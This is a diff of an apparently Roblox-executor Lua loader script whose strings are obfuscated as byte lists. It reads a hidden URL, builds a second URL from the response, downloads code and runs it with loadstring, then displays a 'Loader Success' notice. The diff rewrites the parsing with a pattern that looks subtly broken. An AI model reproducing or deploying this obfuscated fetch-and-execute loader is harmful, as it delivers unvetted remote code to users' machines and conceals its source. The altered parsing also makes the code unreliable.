@@ -8,7 +8,7 @@ local _L = {
     [3] = string.char(109,97,105,110),
     [4] = string.char(83,116,97,114,116,101,114,71,117,105),
     [5] = string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110),
-    [6] = string.char(91,37,115,92,114,92,110,93)
+    [6] = string.char(94,37,119,43)
 }
 
 local function _Init()
@@ -18,24 +18,32 @@ local function _Init()
     local s, d = pcall(game.HttpGet, game, _L[1])
     if not s or d == "" then return end
 
-    local function _C(v) return v:gsub(_L[6], "") end
-    local sp = string.split(d, "\n")
-    local u, r = _C(sp[1]), _C(sp[2])
+    local lines = {}
+    for word in d:gmatch(_L[6]) do
+        table.insert(lines, word)
+    end
+    
+    local u = lines[1]
+    local r = lines[2]
 
-    local url = _L[2] .. u .. "/" .. r .. "/" .. _L[3] .. "/" .. f
-    local sc, res = pcall(game.HttpGet, game, url)
+    if u and r then
+        local url = _L[2] .. u .. "/" .. r .. "/" .. _L[3] .. "/" .. f
+        local sc, res = pcall(game.HttpGet, game, url)
 
-    if sc and res ~= "404: Not Found" then
-        local exe = loadstring(res)
-        if exe then
-            pcall(function()
-                game:GetService(_L[4]):SetCore(_L[5], {
-                    Title = "Loader",
-                    Text = "Success",
-                    Duration = 5
-                })
-            end)
-            exe()
+        if sc and res ~= "404: Not Found" then
+            local exe = loadstring(res)
+            if exe then
+                pcall(function()
+                    game:GetService(_L[4]):SetCore(_L[5], {
+                        Title = "Loader",
+                        Text = "Success",
+                        Duration = 5
+                    })
+                end)
+                exe()
+            end
+        else
+            warn("URL Error: " .. tostring(url))
         end
     end
 end
